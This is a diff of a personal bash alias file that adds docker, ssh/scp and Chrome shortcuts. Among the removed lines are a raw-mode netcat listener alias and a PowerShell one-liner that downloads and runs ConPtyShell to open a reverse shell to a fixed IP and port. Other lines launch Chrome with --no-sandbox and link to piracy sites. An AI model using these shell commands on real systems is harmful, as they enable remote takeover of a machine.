@@ -149,6 +149,8 @@ alias pushwh='docker push michadockermisha/backup:whisper'
 alias startwh='docker start -ai whisper'
 alias portainer='docker pull michadockermisha/backup:portainer && docker run -d -p 9000:9000 --name portainer --restart always -v /var/run/docker.sock:/var/run/docker.sock michadockermisha/backup:portainer && ff localhost:9000'
 
+alias webtop="bash /mnt/c/study/docker/files/scripts/alpinewebgui.sh"
+
 alias nmap="drun nmap michadockermisha/backup:nmap"
 
 alias kraken='drun gitkraken michadockermisha/backup:gitkraken sh -c "apk add rsync && rsync -aP /home/* /c/kraken && exit" && cd /mnt/c/kraken/ && cmd.exe /c "gitkraken.exe"'
@@ -227,11 +229,11 @@ alias win='cmd.exe /c ""C:\Program Files (x86)\VMware\VMware Workstation\vmrun.e
 alias vmkey='cat /mnt/c/backup/windowsapps/install/vmware/key.txt'
 
 
-##natcat
-alias nc='stty raw -echo; (stty size; cat) | nc -lvnp 3001'
-alias ncwinserv='cat " IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 172.17.211.249 3001"'
-
+#SSH
 alias ssk='ssh-keygen -t rsa -b 2048 && ssh-copy-id'
+alias scpwhisper="echo 'scp a.mp3 micha@192.168.1.195:/home/micha/' "
+alias scprox="echo 'scp  root@192.168.1.222:/root' "
+
 
 #CD aliases
 alias c='cd /mnt/c/'
@@ -385,24 +387,25 @@ alias poweroff='shutdown.exe /s /t 0'
 alias reboot='shutdown.exe /r /t 0'
 
 
-#firefox
+#firefox/chrome
+alias gc="google-chrome  --no-sandbox"
 alias ff='cmd.exe /c start firefox'
 alias ffd='ff https://hub.docker.com/repository/docker/michadockermisha/backup/tags?page=1&ordering=last_updated'
-alias yt='ff youtube.com'
-alias gt='ff github.com'
+alias yt='gc youtube.com'
+alias gt='gc github.com'
 alias gtp='ff https://github.com/Michaelunkai/python'
 alias gpt='ff https://chat.openai.com/'
 alias pocket='ff https://getpocket.com/saves?src=navbar'
 alias 1337='ff https://1337x.to/home/'
 alias fitgirl='ff https://1337x.to/search/fitgirl/46/'
 alias gmail='ff https://mail.google.com/mail/u/0/'
-alias ytlater='ff https://www.youtube.com/playlist?list=WL'
+alias ytlater='gc https://www.youtube.com/playlist?list=WL'
 alias gamespot='ff https://www.gamespot.com/'
 alias anime='ff https://9animetv.to/home'
-alias aws="ff https://us-east-1.console.aws.amazon.com/console/home?region=us-east-1#"
+alias aws="gc https://us-east-1.console.aws.amazon.com/console/home?region=us-east-1#"
 
 alias ha="ff http://homeassistant.local:8123/"
-alias prox="ff 77.127.172.96:8006"
+alias prox="gc 77.127.172.96:8006"
 alias plex="ff 77.127.172.96:32400"
 
 #EXE
